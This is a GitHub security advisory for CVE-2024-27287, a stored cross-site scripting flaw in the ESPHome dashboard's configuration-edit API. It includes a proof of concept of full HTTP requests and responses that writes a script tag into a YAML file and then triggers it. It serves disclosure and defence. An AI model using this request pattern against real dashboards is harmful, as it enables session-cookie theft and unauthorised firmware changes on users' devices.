# [M] esphome vulnerable to stored Cross-site Scripting in edit configuration file API

## Summary
Severity: Medium
Advisory: GHSA-9p43-hj5j-96h5
CVE: CVE-2024-27287
CWE: CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2024-03-06
Source: https://github.com/advisories/GHSA-9p43-hj5j-96h5
Type: github-advisory

## Affected
- PyPI: `esphome` — affected >=2023.12.9 <2024.2.2

## Details
### Summary
Edit configuration file API in dashboard component of ESPHome version 2023.12.9 (command line installation and Home Assistant add-on) serves unsanitized data with “Content-Type: text/html; charset=UTF-8”, allowing remote authenticated user to inject arbitrary web script and exfiltrate session cookies via Cross-Site scripting (XSS).

### Credits
Spike Reply Cybersecurity Teams

### Details
It is possible for a malicious authenticated user to inject arbitrary Javascript in configuration files using a POST request to the /edit endpoint, the configuration parameter allows to specify the file to write. 

To trigger the XSS vulnerability, the victim must visit the page /edit?configuration=[xss file].

### PoC

To reproduce the issue, it is possible to perform a POST request to inject the payload:

request:
POST /edit?configuration=xss.yaml HTTP/1.1
Host: localhost:6052
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:6052/
Connection: close
Cookie: authenticated=[replace with valid cookie]
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Content-Length: 40
 
<script>alert(document.cookie);</script>

__________________________

response:
HTTP/1.1 200 OK
Server: TornadoServer/6.3.3
Content-Type: text/html; charset=UTF-8
Date: Thu, 30 Nov 2023 11:02:27 GMT
Content-Length: 0
Connection: close

And subsequently trigger the XSS with a GET request to the same endpoint:

request:
GET /edit?configuration=xss.yaml HTTP/1.1
Host: localhost:6052
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:6052/
Connection: close
Cookie: authenticated=2|1:0|10:1701341719|13:authenticated|4:eWVz|0907127d7274094cc5a2490b95becf5c11fd52b8c3ee3655d65fe9fda099108c
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Content-Length: 0

________________________________

response:
HTTP/1.1 200 OK
Server: TornadoServer/6.3.3
Content-Type: text/html; charset=UTF-8
Date: Thu, 30 Nov 2023 11:04:12 GMT
Etag: "ec6c9889f5c9a6c8e9d2d5e4ce1b1a85e6e7da2b"
Content-Length: 40
Connection: close
 
<script>alert(document.cookie);</script>


### Impact
Abusing this vulnerability a malicious actor could perform operations on the dashboard on the behalf of a logged user, access sensitive information, create, edit and delete configuration files and flash firmware on managed boards.
In addition to this, cookies are not correctly secured, allowing the exfiltration of session cookie values.

### Credits
Spike Reply Cybersecurity Team

## References
- https://github.com/esphome/esphome/security/advisories/GHSA-9p43-hj5j-96h5
- https://github.com/esphome/esphome/commit/37d2b3c7977a4ccbec59726ca7549cb776661455
- https://github.com/esphome/esphome
